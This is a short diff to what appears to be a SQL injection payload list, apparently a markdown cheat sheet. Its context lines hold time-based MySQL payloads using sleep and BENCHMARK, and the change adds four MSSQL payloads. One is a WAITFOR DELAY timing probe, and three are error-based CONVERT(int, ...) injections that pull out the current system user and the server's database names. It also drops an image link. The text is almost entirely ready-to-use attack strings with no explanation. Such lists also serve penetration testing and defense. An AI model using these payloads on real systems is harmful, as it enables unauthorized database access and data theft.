@@ -1092,9 +1092,13 @@ a' or (SELECT 1 FROM (select(sleep(5)))a) or '1'='1
 BENCHMARK(10000000,MD5('x'))
 
 '1'='1' and (1=1) or '1' //like '1'
+
+admin';WAITFOR DELAY '0:0:3'--
+admin';SELECT CONVERT(int,SYSTEM_USER)--
+admin';SELECT CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+admin';SELECT CONVERT(int,(SELECT name+'_' FROM sys.databases FOR XML PATH('')))--
 ```
 
-![dd.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1759468435547-4eba92ad-6989-4ed0-bebd-547713c12832.png)
 
 ```plain
 or 1/(CASE WHEN current_user like'%' THEN exp(710) ELSE 1 END)=1
